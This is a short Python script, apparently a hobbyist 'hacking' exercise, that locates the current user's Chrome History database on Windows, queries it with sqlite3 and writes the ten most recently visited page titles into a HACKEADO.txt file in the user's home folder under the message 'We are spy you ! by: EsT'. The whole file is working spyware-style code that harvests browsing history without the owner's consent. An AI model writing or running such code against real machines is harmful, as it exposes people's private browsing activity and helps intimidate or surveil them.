import sqlite3
from pathlib import Path
from time import sleep
import os
#from os import getlogin


FILE_NAME = "\\HACKEADO.txt"

def access_path_chrome():
    history_path = "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"
    home_path = Path.home()
    path_to_analyze = str(home_path) + history_path
    return path_to_analyze if os.path.isfile(path_to_analyze) else None

    #return str(home_path) + history_path # (Path.home) Accede al path "home" [unidad] [Users] [nombre de usuario]

def collect_data_history(history_path_chrome):
    i = 1
    if history_path_chrome != None:
        while i <= 10:
            try:
                connection = sqlite3.connect(history_path_chrome)
                cursor = connection.cursor()
                cursor.execute("SELECT title, last_visit_time, url FROM urls ORDER BY last_visit_time DESC")
                urls = cursor.fetchall()
                connection.close()
                print ("[+] Access get to Chrome history !")
                return urls
            except:
                print("[-] Retrying in 5 seconds...")
                sleep(5)
                i += 1
        else:
            print("[-] The user use Chrome for along time, try again")
    else:
        print("[-] Something went wrong (Path is incorrect !)")    

def create_file(data_history):
    if data_history != None:
        file = open(str(Path.home()) + FILE_NAME, "w")
        file.write("We are spy you ! by: EsT\n\n")  
        for item in data_history[:10]:
            file.write("[+] Url visited: {}\n".format(item[0]))
        file.close()
    else:
        print("[-] Something went wrong (History is empty !)") 

#user = getlogin() Muestra el nombre del usuario logeado en este momento
#print(user)

if __name__ == "__main__":
    history_path_chrome = access_path_chrome()
    data_history = collect_data_history(history_path_chrome)
    create_file(data_history)